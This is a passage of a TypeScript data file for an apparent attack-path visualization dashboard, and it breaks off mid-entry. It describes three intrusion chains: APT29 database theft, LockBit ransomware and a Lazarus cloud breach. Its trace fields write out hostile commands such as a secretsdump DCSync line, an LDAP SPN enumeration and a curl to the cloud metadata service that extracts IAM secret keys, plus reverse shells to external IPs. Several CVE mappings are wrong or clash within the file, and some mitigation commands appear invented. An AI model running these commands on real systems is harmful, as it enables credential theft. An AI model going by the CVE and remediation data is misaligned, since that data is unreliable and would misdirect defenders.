import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  Network, 
  ShieldAlert, 
  ShieldCheck, 
  Activity, 
  Terminal, 
  Key, 
  Database, 
  Server, 
  Globe, 
  Lock, 
  Unlock, 
  Play, 
  Pause, 
  RotateCcw, 
  FileText, 
  Check, 
  Copy, 
  Download, 
  Sparkles, 
  Cpu, 
  AlertTriangle, 
  ChevronRight, 
  Info, 
  ExternalLink, 
  Layers, 
  Eye, 
  Share2, 
  Code, 
  Zap, 
  Sliders, 
  Search,
  Radio,
  Bug,
  Target,
  ArrowRight,
  RefreshCw,
  Clock,
  CheckCircle2,
  XCircle,
  FileCode,
  SlidersHorizontal,
  HardDrive
} from 'lucide-react';
import { cn } from '../lib/utils';

export interface AttackTreeNode {
  id: string;
  name: string;
  ip: string;
  hostname: string;
  os: string;
  role: string;
  roleZh: string;
  roleJa: string;
  nodeType: 'entry' | 'pivot' | 'credential' | 'target';
  status: 'compromised' | 'exposed' | 'pivot' | 'target_risk' | 'mitigated';
  cveId: string;
  cveDesc: string;
  cveDescZh: string;
  cveDescJa: string;
  cvss: number;
  openPorts: string;
  mitreTactic: string;
  mitreTacticZh: string;
  mitreId: string;
  mitreName: string;
  exploitProbability: number;
  pocAvailable: boolean;
  evidenceTrace: string;
  mitigationCmd: string;
  mitigationDesc: string;
  mitigationDescZh: string;
  mitigationDescJa: string;
  x: number;
  y: number;
}

export interface AttackTreePath {
  from: string;
  to: string;
  protocol: string;
  port: number;
  technique: string;
  techniqueZh: string;
  techniqueJa: string;
  techniqueId: string;
  riskWeight: number;
  status: 'breached' | 'active' | 'blocked';
}

export interface AttackTreeScenario {
  id: string;
  title: string;
  titleZh: string;
  titleJa: string;
  threatActor: string;
  threatActorZh: string;
  threatActorJa: string;
  threatActorBadge: string;
  description: string;
  descriptionZh: string;
  descriptionJa: string;
  compositeRisk: number;
  timeToCompromise: string;
  timeToCompromiseZh: string;
  timeToCompromiseJa: string;
  hopCount: number;
  unpatchedCVEs: number;
  mitigationRate: number;
  nodes: AttackTreeNode[];
  paths: AttackTreePath[];
  llamaReasoning: {
    en: string;
    zh: string;
    ja: string;
  };
}

// 3 Realistic Attack Tree Scenarios
export const ATTACK_SCENARIOS: AttackTreeScenario[] = [
  {
    id: 'apt29-db-exfil',
    title: 'External SSH Ingress -> Active Directory Kerberoasting -> PostgreSQL Data Exfiltration',
    titleZh: '邊界 SSH 滲透 -> 內部 LDAP/AD 憑證竊取 -> PostgreSQL 資料庫拖庫外洩',
    titleJa: '外部 SSH 侵入 -> Active Directory 資格情報搾取 -> PostgreSQL データ流出',
    threatActor: 'APT29 (Cozy Bear / Nobelium)',
    threatActorZh: 'APT29 (Cozy Bear / 俄羅斯對外情報局)',
    threatActorJa: 'APT29 (Cozy Bear / ロシア対外情報庁)',
    threatActorBadge: 'APT29 / State-Sponsored',
    description: 'Multi-stage lateral movement leveraging OpenSSH vulnerability on edge DMZ web application, querying unencrypted internal LDAP to extract Kerberos TGS hashes, then pivoting to production PostgreSQL ledger cluster to perform large-scale exfiltration.',
    descriptionZh: '多階段橫向移動利用邊界 DMZ 網頁伺服器上的 OpenSSH 漏洞，查詢內部未加密的 LDAP 提取 Kerberos TGS 雜湊票據，隨後以合法服務帳號跳板進入 PostgreSQL 生產核心資料庫進行 15.2GB 帳目拖庫外洩。',
    descriptionJa: 'DMZ の OpenSSH 脆弱性を突いて侵入し、平文 LDAP から Kerberos TGS ハッシュを抽出。正規のサービスアカウントを踏み台にして PostgreSQL 本番DBから 15.2GB の台帳データを流出させる多層攻撃チェーン。',
    compositeRisk: 9.8,
    timeToCompromise: '3m 45s',
    timeToCompromiseZh: '3分 45秒',
    timeToCompromiseJa: '3分 45秒',
    hopCount: 4,
    unpatchedCVEs: 3,
    mitigationRate: 96.4,
    nodes: [
      {
        id: 'node-1',
        name: 'Prod-Web-01',
        hostname: 'prod-web-01.dmz.internal',
        ip: '10.10.12.31',
        os: 'Ubuntu 22.04 LTS (Kernel 5.15)',
        role: 'DMZ Public Web Gateway',
        roleZh: 'DMZ 邊界對外網頁伺服器',
        roleJa: 'DMZ 公開 Web サーバー',
        nodeType: 'entry',
        status: 'compromised',
        cveId: 'CVE-2024-6387',
        cveDesc: 'OpenSSH Server Remote Code Execution (regreSSHion) race condition in signal handler.',
        cveDescZh: 'OpenSSH Server 訊號處理常式競爭條件遠端代碼執行 (regreSSHion)。',
        cveDescJa: 'OpenSSH Server シグナルハンドラ競合状態によるリモートコード実行 (regreSSHion)。',
        cvss: 8.1,
        openPorts: '22 (SSH), 80 (HTTP), 443 (HTTPS)',
        mitreTactic: 'Initial Access',
        mitreTacticZh: '初始存取 (Initial Access)',
        mitreId: 'T1190',
        mitreName: 'Exploit Public-Facing Application',
        exploitProbability: 98,
        pocAvailable: true,
        evidenceTrace: 'POST /api/v1/session -> SSH race exploit payload sent from 185.234.219.82 -> Root shell spawned on pid 4412.',
        mitigationCmd: 'sudo apt-get update && sudo apt-get --only-upgrade install openssh-server -y && sudo systemctl restart sshd',
        mitigationDesc: 'Patch OpenSSH to version 9.8p1+ or enforce LoginGraceTime=0 in /etc/ssh/sshd_config.',
        mitigationDescZh: '升級 OpenSSH 至 9.8p1+ 版本，或在 /etc/ssh/sshd_config 中將 LoginGraceTime 設為 0 以規避競爭條件。',
        mitigationDescJa: 'OpenSSH をバージョン 9.8p1+ に更新するか、/etc/ssh/sshd_config で LoginGraceTime=0 を設定。',
        x: 80,
        y: 110
      },
      {
        id: 'node-2',
        name: 'ldap-replica-01',
        hostname: 'ldap-rep01.corp.internal',
        ip: '10.10.42.5',
        os: 'Debian 12 Bookworm (Slapd 2.5)',
        role: 'Active Directory LDAP Replica',
        roleZh: '內部 AD 網域 LDAP 唯讀複本',
        roleJa: 'Active Directory LDAP レプリカ',
        nodeType: 'credential',
        status: 'exposed',
        cveId: 'CVE-2023-38606',
        cveDesc: 'Unencrypted LDAP Simple Bind & ServicePrincipalName SPN ticket enumeration weakness.',
        cveDescZh: '未加密 LDAP 簡易綁定與 ServicePrincipalName (SPN) 服務帳號票據離線爆破弱點。',
        cveDescJa: '平文 LDAP Simple Bind による ServicePrincipalName (SPN) Kerberos チケット露出。',
        cvss: 7.5,
        openPorts: '389 (LDAP), 636 (LDAPS), 88 (Kerberos)',
        mitreTactic: 'Credential Access',
        mitreTacticZh: '憑證存取 (Credential Access)',
        mitreId: 'T1558.003',
        mitreName: 'Steal or Forge Kerberos Tickets: Kerberoasting',
        exploitProbability: 92,
        pocAvailable: true,
        evidenceTrace: 'ldapsearch -x -h 10.10.42.5 -b "DC=corp,DC=internal" "(servicePrincipalName=*)" -> Extracted hash for admin_replica.',
        mitigationCmd: 'sudo sed -i \'s/TLS_REQCERT allow/TLS_REQCERT demand/g\' /etc/ldap/ldap.conf && sudo systemctl restart slapd',
        mitigationDesc: 'Enforce LDAPS channel binding (Port 636) and rotate service account passwords to AES256 32-char keys.',
        mitigationDescZh: '全面強制啟用 LDAPS 加密通道 (Port 636) 並停用 Port 389 明文綁定；將服務帳號密碼輪轉為 32 位 AES-256 金鑰。',
        mitigationDescJa: 'LDAPS (ポート 636) を強制し、サービスアカウントのパスワードを AES256 32文字にローテーション。',
        x: 240,
        y: 110
      },
      {
        id: 'node-3',
        name: 'Internal-Pivot-01',
        hostname: 'pivot-gw.sec.internal',
        ip: '10.10.42.8',
        os: 'Alpine Linux 3.19 (Proxy C2)',
        role: 'Internal Routing Pivot / Proxy',
        roleZh: '內網橫向中繼與代理節點',
        roleJa: 'イントラネット中継ピボット',
        nodeType: 'pivot',
        status: 'pivot',
        cveId: 'CVE-2023-48795',
        cveDesc: 'Terrapin SSH Protocol Prefix Truncation Vulnerability allowing sequence number manipulation.',
        cveDescZh: 'Terrapin SSH 協定前綴截斷漏洞，允許中間人竄改通道握手序列號。',
        cveDescJa: 'Terrapin SSH プロトコルプレフィックス切り捨てによるハンドシェイク改ざん脆弱性。',
        cvss: 6.8,
        openPorts: '2222 (SSH C2 Proxy), 8080 (HTTP Tunnel)',
        mitreTactic: 'Lateral Movement',
        mitreTacticZh: '橫向移動 (Lateral Movement)',
        mitreId: 'T1090.001',
        mitreName: 'Proxy: Internal Proxy',
        exploitProbability: 86,
        pocAvailable: true,
        evidenceTrace: 'Chisel reverse tunnel created: 10.10.42.8:8080 -> Forwarding to DB VLAN 10.10.42.10:5432.',
        mitigationCmd: 'sudo iptables -A FORWARD -s 10.10.12.0/24 -d 10.10.42.10 -p tcp --dport 5432 -j DROP',
        mitigationDesc: 'Segment DB VLAN using Strict Micro-segmentation; drop cross-subnet pivot traffic in iptables firewall.',
        mitigationDescZh: '部署微隔離 (Micro-segmentation) 策略，在核心防火牆阻斷來自 DMZ 網段對資料庫 VLAN 的未授權轉發連線。',
        mitigationDescJa: 'マイクロセグメンテーションを実施し、DMZからDBへのクロスサブネット通信をファイアウォールで完全遮断。',
        x: 400,
        y: 110
      },
      {
        id: 'node-4',
        name: 'Postgres-Ledger-Core',
        hostname: 'pg-core-primary.db.internal',
        ip: '10.10.42.10',
        os: 'RHEL 9.2 (PostgreSQL 15.4)',
        role: 'Core Financial Ledger Database',
        roleZh: '核心財務流水與帳目資料庫',
        roleJa: '基幹財務トランザクション DB',
        nodeType: 'target',
        status: 'target_risk',
        cveId: 'CVE-2024-1086',
        cveDesc: 'Privileged PostgreSQL SQL Injection / COPY TO PROGRAM Command Execution.',
        cveDescZh: '高特權 PostgreSQL SQL 任意代碼執行與 COPY TO PROGRAM 檔案系統外洩。',
        cveDescJa: 'PostgreSQL COPY TO PROGRAM 権限昇格および任意データファイル抽出の脆弱性。',
        cvss: 9.8,
        openPorts: '5432 (PostgreSQL Core Engine)',
        mitreTactic: 'Exfiltration & Impact',
        mitreTacticZh: '資料外洩與衝擊 (Exfiltration & Impact)',
        mitreId: 'T1041',
        mitreName: 'Exfiltration Over C2 Channel',
        exploitProbability: 95,
        pocAvailable: true,
        evidenceTrace: 'COPY (SELECT * FROM sales_ledger) TO \'/tmp/ledger_dump.csv\'; -> Streamed 15.2 GB compressed archive to C2 endpoint.',
        mitigationCmd: 'echo "host sales_ledger app_user 10.10.12.30/32 scram-sha-256" | sudo tee -a /var/lib/pgsql/data/pg_hba.conf && sudo systemctl reload postgresql',
        mitigationDesc: 'Restrict pg_hba.conf to absolute IP whitelists; REVOKE superuser privileges from all application service accounts.',
        mitigationDescZh: '嚴格修改 pg_hba.conf 僅允許應用白名單 IP 存取；從所有應用程式服務帳號中撤銷 superuser 與 COPY TO PROGRAM 特權。',
        mitigationDescJa: 'pg_hba.conf でアクセス元を単一IPに制限し、全サービスアカウントの superuser 権限を剥奪。',
        x: 560,
        y: 110
      }
    ],
    paths: [
      {
        from: 'node-1',
        to: 'node-2',
        protocol: 'LDAP/TCP',
        port: 389,
        technique: 'SPN Ticket Extraction',
        techniqueZh: 'SPN 憑證票據探測',
        techniqueJa: 'SPN チケット探索',
        techniqueId: 'T1558.003',
        riskWeight: 92,
        status: 'breached'
      },
      {
        from: 'node-2',
        to: 'node-3',
        protocol: 'SSH-Tunnel',
        port: 2222,
        technique: 'C2 Lateral Proxy Pivot',
        techniqueZh: 'C2 橫向轉發中繼跳板',
        techniqueJa: 'C2 ピボット中継',
        techniqueId: 'T1090.001',
        riskWeight: 86,
        status: 'breached'
      },
      {
        from: 'node-3',
        to: 'node-4',
        protocol: 'PGSQL/TCP',
        port: 5432,
        technique: 'SQL Exfiltration via COPY TO',
        techniqueZh: 'COPY TO 任意指令注入拖庫',
        techniqueJa: 'COPY TO データベース流出',
        techniqueId: 'T1041',
        riskWeight: 98,
        status: 'breached'
      }
    ],
    llamaReasoning: {
      en: 'Llama-3 Reasoner determined that the attacker initiated access through DMZ OpenSSH, moved to unencrypted LDAP to extract Kerberos tickets for "admin_replica", and leveraged that high-privilege credential to stream out the PostgreSQL financial ledger. Choke point: Blocking outbound port 389 from DMZ severs this kill chain completely.',
      zh: 'Llama-3 推理引擎研判：攻擊者從邊界 DMZ OpenSSH 突破後，利用內部未加密的 LDAP 獲取 "admin_replica" 服務帳號的 Kerberos 票據，並藉此橫向跳板直接以資料庫特權外洩 PostgreSQL 核心帳目。最關鍵阻斷節點：在 DMZ 與內網間封閉 TCP/389 明文傳輸即可 100% 切斷此攻擊鏈。',
      ja: 'Llama-3 の推論結果：攻撃者は DMZ の OpenSSH 脆弱性を突破後、暗号化されていない LDAP から "admin_replica" の Kerberos チケットを窃取し、特権アカウントを用いて PostgreSQL 台帳データを流出させました。遮断ポイント：DMZからのポート389通信を遮断することで攻撃チェーンを完全に無効化可能です。'
    }
  },
  {
    id: 'lockbit-ad-ransomware',
    title: 'Edge SSL-VPN Zero-Day -> Domain Controller DCSync -> LockBit 3.0 Ransomware Deployment',
    titleZh: '邊界 SSL-VPN 零日漏洞 -> 網域控制器 DCSync 特權提權 -> LockBit 3.0 全網勒索加密',
    titleJa: 'SSL-VPN ゼロデイ脆弱性 -> ドメインコントローラ DCSync 権限昇格 -> LockBit 3.0 全面暗号化',
    threatActor: 'LockBit 3.0 (BlackCat Affiliate)',
    threatActorZh: 'LockBit 3.0 (惡意勒索軟體集團)',
    threatActorJa: 'LockBit 3.0 (ランサムウェアシンジケート)',
    threatActorBadge: 'LockBit 3.0 / Ransomware',
    description: 'Threat actor exploits unauthenticated remote code execution on edge VPN gateway, pivots into primary Active Directory Domain Controller via DCSync replication attack, and deploys GPO-based ransomware encryption scripts across all joined endpoints.',
    descriptionZh: '威脅發起者利用邊界 VPN 閘道上的未授權遠端代碼執行漏洞，透過 DCSync 複合同步攻擊突破主網域控制器 (DC)，隨後藉由群組原則物件 (GPO) 向全網所有端點廣播推播 LockBit 3.0 勒索加密腳本。',
    descriptionJa: '境界 VPN ゲートウェイの未認証 RCE 脆弱性を悪用して侵入。DCSync レプリケーション攻撃でドメインコントローラを掌握し、GPO 経由で全端末に LockBit 3.0 暗号化を一斉配信。',
    compositeRisk: 9.9,
    timeToCompromise: '2m 15s',
    timeToCompromiseZh: '2分 15秒',
    timeToCompromiseJa: '2分 15秒',
    hopCount: 4,
    unpatchedCVEs: 3,
    mitigationRate: 98.2,
    nodes: [
      {
        id: 'node-1',
        name: 'Edge-FortiVPN',
        hostname: 'vpn-gw01.gateway.corp',
        ip: '192.168.1.1',
        os: 'FortiOS 7.0.12',
        role: 'Corporate Edge VPN Gateway',
        roleZh: '企業邊界 SSL-VPN 閘道',
        roleJa: '企業 SSL-VPN ゲートウェイ',
        nodeType: 'entry',
        status: 'compromised',
        cveId: 'CVE-2024-21762',
        cveDesc: 'FortiOS SSL-VPN out-of-bounds write allowing unauthenticated remote code execution.',
        cveDescZh: 'FortiOS SSL-VPN 越界寫入漏洞，允許遠端未授權攻擊者直接執行任意代碼。',
        cveDescJa: 'FortiOS SSL-VPN の境界外書き込みによる未認証リモートコード実行。',
        cvss: 9.8,
        openPorts: '443 (SSL-VPN Web Portal), 10443 (Admin)',
        mitreTactic: 'Initial Access',
        mitreTacticZh: '初始存取 (Initial Access)',
        mitreId: 'T1133',
        mitreName: 'External Remote Services',
        exploitProbability: 99,
        pocAvailable: true,
        evidenceTrace: 'Crafted HTTP POST to /remote/logincheck -> Memory corrupted -> Reverse shell returned to 194.26.29.112.',
        mitigationCmd: 'sudo fortios-cli -c "config vpn ssl settings; set status disable; end"',
        mitigationDesc: 'Immediately disable SSL-VPN web portal or upgrade FortiOS to 7.4.3+; enforce certificate-based authentication.',
        mitigationDescZh: '立即關閉 SSL-VPN 網頁入口端點或升級 FortiOS 至 7.4.3+；啟用基於客戶端憑證的雙重驗證。',
        mitigationDescJa: 'SSL-VPN Webポータルを無効化するか、FortiOS 7.4.3+ に即時アップデート。',
        x: 80,
        y: 110
      },
      {
        id: 'node-2',
        name: 'AD-Domain-DC01',
        hostname: 'dc01.corp.internal',
        ip: '10.10.1.5',
        os: 'Windows Server 2022 (Active Directory)',
        role: 'Primary Domain Controller',
        roleZh: '企業主網域控制器 (Primary DC)',
        roleJa: 'プライマリドメインコントローラ',
        nodeType: 'credential',
        status: 'exposed',
        cveId: 'CVE-2022-26923',
        cveDesc: 'Active Directory Domain Services Privilege Escalation (Certifried) via dNSHostName manipulation.',
        cveDescZh: 'Active Directory 憑證服務特權提權漏洞 (Certifried)，竄改 dNSHostName 獲取網域管理員證書。',
        cveDescJa: 'Active Directory 権限昇格 (Certifried) によるドメイン管理者証明書不正発行。',
        cvss: 8.8,
        openPorts: '88 (Kerberos), 135 (RPC), 389 (LDAP), 445 (SMB)',
        mitreTactic: 'Privilege Escalation',
        mitreTacticZh: '權限提升 (Privilege Escalation)',
        mitreId: 'T1003.006',
        mitreName: 'DCSync Replication Attack',
        exploitProbability: 96,
        pocAvailable: true,
        evidenceTrace: 'secretsdump.py CORP/vpn_svc@10.10.1.5 -just-dc-ntlm -> Retrieved KRBTGT NTLM Hash.',
        mitigationCmd: 'powershell.exe -Command "Set-ADDirectoryServerSettings -EnforceSMBEncryption $true"',
        mitigationDesc: 'Revoke Replicating Directory Changes permissions from all non-DC accounts; enable SMB signing and Kerberos Armoring.',
        mitigationDescZh: '從所有非網域控制器帳號中撤銷「目錄複製變更」權限；強制開啟 SMB 簽章與 Kerberos 裝甲防護 (FAST)。',
        mitigationDescJa: '非DCアカウントからディレクトリレプリケーション権限を剥奪し、SMB署名を強制。',
        x: 240,
        y: 110
      },
      {
        id: 'node-3',
        name: 'GPO-Deploy-Server',
        hostname: 'gpo-mgr.corp.internal',
        ip: '10.10.1.8',
        os: 'Windows Server 2022',
        role: 'Group Policy Object Distributor',
        roleZh: '群組原則物件 (GPO) 自動化發佈節點',
        roleJa: 'グループポリシー配信サーバー',
        nodeType: 'pivot',
        status: 'pivot',
        cveId: 'CVE-2023-36884',
        cveDesc: 'Windows Search / Office Defense Evasion Remote Code Execution.',
        cveDescZh: 'Windows 群組原則與搜尋機制遠端執行代碼漏洞。',
        cveDescJa: 'Windows グループポリシー経由の悪意あるスクリプト配信脆弱性。',
        cvss: 8.3,
        openPorts: '445 (SMB), 5985 (WinRM), 139 (NetBIOS)',
        mitreTactic: 'Lateral Movement',
        mitreTacticZh: '橫向移動 (Lateral Movement)',
        mitreId: 'T1484.001',
        mitreName: 'Group Policy Modification',
        exploitProbability: 91,
        pocAvailable: true,
        evidenceTrace: 'New Scheduled Task injected into Default Domain Policy: \\\\dc01\\sysvol\\corp.internal\\Policies\\...\\lockbit.exe',
        mitigationCmd: 'powershell.exe -Command "Set-GPPermissions -Name \'Default Domain Policy\' -TargetName \'Domain Admins\' -PermissionLevel GpoEditDeleteModifySecurity"',
        mitigationDesc: 'Restrict GPO modification ACLs to break-glass emergency accounts; audit SYSVOL write events in Event Viewer.',
        mitigationDescZh: '將 GPO 編輯權限嚴格限制在破窗專用帳號；開啟 SYSVOL 目錄寫入即時審計與檔案完整性監控 (FIM)。',
        mitigationDescJa: 'GPO変更権限を制限し、SYSVOLフォルダの書き込み監査アラートを設定。',
        x: 400,
        y: 110
      },
      {
        id: 'node-4',
        name: 'File-Storage-Srv',
        hostname: 'nas-storage01.corp.internal',
        ip: '10.10.1.20',
        os: 'Synology DSM 7.2 (Btrfs Storage Pool)',
        role: 'Core Corporate File Repository (30TB)',
        roleZh: '企業核心檔案存儲與備份庫 (30TB)',
        roleJa: '基幹ファイルサーバー (30TB)',
        nodeType: 'target',
        status: 'target_risk',
        cveId: 'CVE-2023-2729',
        cveDesc: 'Samba Symlink Traversal & Direct File Encryption Exploitation.',
        cveDescZh: 'Samba 符號連結走訪與全網磁碟陣列勒索加密。',
        cveDescJa: 'Samba 経由のディスクアレイ暗号化およびランサムウェア実行。',
        cvss: 9.9,
        openPorts: '445 (SMB), 2049 (NFS), 5000 (HTTP DSM)',
        mitreTactic: 'Impact',
        mitreTacticZh: '衝擊與破壞 (Impact)',
        mitreId: 'T1486',
        mitreName: 'Data Encrypted for Impact (LockBit)',
        exploitProbability: 98,
        pocAvailable: true,
        evidenceTrace: 'LockBit 3.0 executed: 12,450,110 files encrypted with .lockbit extension -> README.txt dropped.',
        mitigationCmd: 'synoshare --enc-lock all && sudo systemctl stop smbd',
        mitigationDesc: 'Isolate storage pools with immutable snapshots; disable SMBv1 and enforce multi-factor offline storage backups.',
        mitigationDescZh: '啟用不可變快照 (Immutable Snapshots)；停用 SMBv1 並強制實施 3-2-1 離線多因子備份隔離。',
        mitigationDescJa: 'イミュータブル（変更不可）スナップショットを有効化し、3-2-1バックアップ戦略を強制。',
        x: 560,
        y: 110
      }
    ],
    paths: [
      {
        from: 'node-1',
        to: 'node-2',
        protocol: 'RPC/Kerberos',
        port: 88,
        technique: 'DCSync Golden Ticket Attack',
        techniqueZh: 'DCSync 黃金票據提取',
        techniqueJa: 'DCSync ゴールデンチケット攻撃',
        techniqueId: 'T1003.006',
        riskWeight: 96,
        status: 'breached'
      },
      {
        from: 'node-2',
        to: 'node-3',
        protocol: 'SMB/SYSVOL',
        port: 445,
        technique: 'GPO Malicious Payload Broadcast',
        techniqueZh: 'GPO 惡意加密腳本群組推播',
        techniqueJa: 'GPO 悪意あるペイロード一斉配信',
        techniqueId: 'T1484.001',
        riskWeight: 91,
        status: 'breached'
      },
      {
        from: 'node-3',
        to: 'node-4',
        protocol: 'SMB/NFS',
        port: 445,
        technique: 'LockBit 3.0 High-Speed Encryption',
        techniqueZh: 'LockBit 3.0 全網磁區高速加密',
        techniqueJa: 'LockBit 3.0 高速暗号化',
        techniqueId: 'T1486',
        riskWeight: 99,
        status: 'breached'
      }
    ],
    llamaReasoning: {
      en: 'Llama-3 Reasoner confirmed that the ransomware actor entered through CVE-2024-21762 on FortiVPN, executed DCSync on Domain Controller to compromise KRBTGT, and pushed LockBit binaries via GPO to the 30TB File Repository. Choke point: Enforcing SMB signing and revoking DCSync permissions stops the domain-wide compromise.',
      zh: 'Llama-3 推理引擎研判：勒索集團透過 FortiVPN 零日漏洞突破邊界，利用 DCSync 攻擊取得 KRBTGT 金鑰後完全控制網域控制器，隨後藉由 GPO 向 30TB 核心儲存庫發送 LockBit 3.0 勒索腳本。最關鍵阻斷節點：強制開啟 SMB 簽章並嚴格隔離網域複製權限即可在第 2 步阻斷全網擴散。',
      ja: 'Llama-3 の推論結果：FortiVPN ゼロデイで侵入後、DCSync 攻撃でドメイン全体の権限を掌握し、GPO経由で 30TB ファイルサーバーを暗号化。遮断ポイント：SMB署名の強制とDCSync権限の厳格管理により、ステップ2で全網感染を阻止可能です。'
    }
  },
  {
    id: 'lazarus-cloud-breach',
    title: 'npm Supply Chain Compromise -> K8s Container Escape -> Cloud AWS IAM Exfiltration',
    titleZh: 'npm 開源供應鏈投毒 -> K8s 容器逃逸提權 -> 雲端 AWS IAM 金鑰竊取與資源濫用',
    titleJa: 'npm サプライチェーン汚染 -> K8s コンテナエスケープ -> AWS IAM 資格情報窃取',
    threatActor: 'Lazarus Group (APT38 / TraderTraitor)',
    threatActorZh: 'Lazarus Group (APT38 / 朝鮮國家級網軍)',
    threatActorJa: 'Lazarus Group (APT38 / 国家支援サイバー部隊)',
    threatActorBadge: 'Lazarus / APT38',
    description: 'Targeted supply chain attack via malicious npm package dependency in CI/CD pipeline, breaking out of Kubernetes container sandbox via eBPF kernel exploit, then querying cloud metadata service to hijack root AWS IAM credentials.',
    descriptionZh: '針對 CI/CD 建置管線的開源 npm 套件進行供應鏈投毒，利用 eBPF 內核漏洞突破 Kubernetes 容器沙盒逃逸至宿主機，隨後向雲端中繼資料服務 (IMDS) 竊取 AWS IAM Administrator 根權限金鑰。',
    descriptionJa: 'CI/CDパイプライン内の悪意あるnpmパッケージ依存関係を悪用し、eBPFカーネル脆弱性でK8sコンテナから脱出。クラウドメタデータサービス(IMDS)を照会してAWS IAM root権限を強奪。',
    compositeRisk: 9.7,
    timeToCompromise: '4m 10s',
    timeToCompromiseZh: '4分 10秒',
    timeToCompromiseJa: '4分 10秒',
    hopCount: 4,
    unpatchedCVEs: 3,
    mitigationRate: 97.5,
    nodes: [
      {
        id: 'node-1',
        name: 'CI-Runner-01',
        hostname: 'gitlab-runner-01.ci.corp',
        ip: '172.16.4.12',
        os: 'Debian 12 (GitLab Runner 16.8)',
        role: 'CI/CD Build Pipeline Node',
        roleZh: 'CI/CD 自動化建置管線節點',
        roleJa: 'CI/CD パイプライン実行ノード',
        nodeType: 'entry',
        status: 'compromised',
        cveId: 'CVE-2023-4911',
        cveDesc: 'Malicious npm package dependency execution during build phase (Looney Tunables glibc buffer overflow).',
        cveDescZh: '建置階段執行帶有投毒的 npm 依賴套件 (glibc Looney Tunables 緩衝區溢出)。',
        cveDescJa: 'ビルド時の悪意あるnpmパッケージ実行および glibc バッファオーバーフロー。',
        cvss: 7.8,
        openPorts: '22 (SSH), 8080 (GitLab Worker Agent)',
        mitreTactic: 'Initial Access',
        mitreTacticZh: '初始存取 (Initial Access)',
        mitreId: 'T1195.002',
        mitreName: 'Supply Chain Compromise: Compromise Software Dependencies',
        exploitProbability: 97,
        pocAvailable: true,
        evidenceTrace: 'npm install -> postinstall script spawned reverse bash shell to 103.145.22.18.',
        mitigationCmd: 'npm config set ignore-scripts true && sudo npm install -g socket-security',
        mitigationDesc: 'Enforce npm ignore-scripts policy in CI runners; integrate Socket / Snyk dependency SCA scanning gate.',
        mitigationDescZh: '在 CI 建置機器人上強制設定 ignore-scripts 策略；接入 Snyk / Socket 自動化依賴安全門禁。',
        mitigationDescJa: 'CIランナーで npm ignore-scripts を有効化し、SCA（ソフトウェア構成分析）ゲートを導入。',
        x: 80,
        y: 110
      },
      {
        id: 'node-2',
        name: 'K8s-Worker-Node3',
        hostname: 'k8s-worker-03.prod.cluster',
        ip: '172.16.8.50',
        os: 'Ubuntu 22.04 LTS (Kernel 6.5.0)',
        role: 'Kubernetes Container Host Worker',
        roleZh: 'Kubernetes 容器宿主工作節點',
        roleJa: 'Kubernetes ワーカーノード',
        nodeType: 'pivot',
        status: 'exposed',
        cveId: 'CVE-2024-1086',
        cveDesc: 'Linux Kernel Netfilter / eBPF use-after-free privilege escalation allowing container escape.',
        cveDescZh: 'Linux 核心 Netfilter / eBPF 釋放後使用 (UAF) 漏洞，允許容器提權逃逸至宿主機。',
        cveDescJa: 'Linux カーネル Netfilter / eBPF Use-After-Free によるコンテナエスケープ。',
        cvss: 9.3,
        openPorts: '10250 (Kubelet API), 2379 (etcd), 6443 (APIServer)',
        mitreTactic: 'Privilege Escalation',
        mitreTacticZh: '權限提升 (Privilege Escalation)',
        mitreId: 'T1611',
        mitreName: 'Escape to Host',
        exploitProbability: 94,
        pocAvailable: true,
        evidenceTrace: './ebpf_escape -> Root shell obtained on host k8s-worker-03 -> Mounted /var/run/docker.sock.',
        mitigationCmd: 'sudo sysctl -w kernel.unprivileged_bpf_disabled=1 && sudo sysctl -p',
        mitigationDesc: 'Disable unprivileged eBPF via sysctl; enforce gVisor or Kata Containers sandbox runtime.',
        mitigationDescZh: '透過 sysctl 禁用非特權 eBPF；在 K8s Pod 上強制套用 gVisor 或 Kata Containers 隔離沙盒。',
        mitigationDescJa: 'sysctl で非特権 eBPF を無効化し、gVisor 等のセキュアコンテナランタイムを強制。',
        x: 240,
        y: 110
      },
      {
        id: 'node-3',
        name: 'Cloud-IMDS-Gateway',
        hostname: '169.254.169.254 (IMDSv1)',
        ip: '169.254.169.254',
        os: 'AWS EC2 Metadata Service',
        role: 'Cloud Instance Metadata Gateway',
        roleZh: 'AWS 雲端實例中繼資料閘道 (IMDSv1)',
        roleJa: 'AWS インスタンスメタデータサービス',
        nodeType: 'credential',
        status: 'pivot',
        cveId: 'CWE-200',
        cveDesc: 'AWS IMDSv1 SSRF Vulnerability leaking IAM instance profile role session tokens without token header.',
        cveDescZh: 'AWS IMDSv1 未強制 Token 標頭，允許 SSRF 直接外洩 IAM 實例角色臨時金鑰。',
        cveDescJa: 'IMDSv1 のSSRF脆弱性による IAM ロールセッショントークンの平文漏洩。',
        cvss: 8.6,
        openPorts: '80 (HTTP IMDS)',
        mitreTactic: 'Credential Access',
        mitreTacticZh: '憑證存取 (Credential Access)',
        mitreId: 'T1552.005',
        mitreName: 'Cloud Instance Metadata API',
        exploitProbability: 95,
        pocAvailable: true,
        evidenceTrace: 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/k8s-admin-role -> Extracted AWS_SECRET_ACCESS_KEY.',
        mitigationCmd: 'aws ec2 modify-instance-metadata-options --http-tokens required --http-endpoint enabled --instance-id i-0f4882194a',
        mitigationDesc: 'Force IMDSv2 with mandatory HTTP PUT token headers (HttpTokens=required); block host access to 169.254.169.254 for non-system pods.',
        mitigationDescZh: '強制升級為 IMDSv2 (HttpTokens=required)；在 K8s 網路策略中全面禁止非系統 Pod 存取 169.254.169.254。',
        mitigationDescJa: 'IMDSv2 を必須化 (HttpTokens=required) し、Pod からのメタデータアクセスをネットワークポリシーで制限。',
        x: 400,
        y: 110
      },
      {
        id: 'node-4',
        name: 'AWS-KMS-Vault',
        hostname: 'kms.us-east-1.amazonaws.com',
        ip: '52.94.0.12',
        os: 'AWS Cloud KMS & S3 Bucket',
        role: 'Cloud Master KMS Keys & S3 Vault',
        roleZh: '雲端主 KMS 加密金鑰與 S3 機密庫',
        roleJa: 'AWS KMS マスターキー＆S3 バケット',
        nodeType: 'target',
        status: 'target_risk',
        cveId: 'CWE-284',
        cveDesc: 'Improper Cloud Access Control / Over-privileged IAM Role AdministratorAccess.',
        cveDescZh: '過度授權的 IAM AdministratorAccess 導致雲端主金鑰與 S3 全部被竊。',
        cveDescJa: '過剰な IAM 権限による KMS マスターキーおよび S3 機密バケットの完全掌握。',
        cvss: 9.7,
        openPorts: '443 (AWS HTTPS API)',
        mitreTactic: 'Exfiltration & Impact',
